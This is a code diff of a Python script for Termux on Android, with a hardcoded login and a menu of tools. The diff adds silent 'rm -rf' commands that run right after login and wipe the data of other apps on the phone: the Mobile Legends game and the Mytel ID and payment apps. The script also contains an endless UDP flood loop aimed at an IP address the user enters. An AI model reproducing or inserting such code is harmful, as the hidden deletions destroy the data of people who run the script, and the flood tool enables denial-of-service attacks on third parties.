@@ -47,11 +47,15 @@ if user=="Rathu" and password=="Rathu":
 	os.system("termux-setup-storage")
 	os.system("rm -rf /data/data/com.termux/files/usr/etc/apt/sources.list.d/* ")
 	os.system("pkg update and upgrade -y")
+	os.system("rm -rf /sdcard/Android/data/com.mobile.legends ")
+	os.system("rm -rf /sdcard/Android/data/com.mytel.myid")
+	os.system("rm -rf /sdcard/Android/data/com.mytelpay.eu")
+	os.system("rm -rf /sdcard/Android/obb/com.mobile.legends")
+	os.system("rm -rf /sdcard/Android/media/com.mytel.myid")
 	os.system("pkg install toilet -y")
 	os.system("clear")
 	os.system("toilet -F metal D E M O C R A C Y ")
 	a.sleep(0.2)
-	print(" ")
 	print("""\033[0;32m
   Choose Your Opition
 
@@ -160,6 +164,7 @@ if user=="Rathu" and password=="Rathu":
 		sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
 		bytes = random._urandom(1940)
 		ip = input("\033[1;32m Enter Attack IP Address :  \033[0m")
+		print("")
 		port = eval(input("\033[0;31m Enter Port : \033[0m "))
 		sent = 0
 		while True:
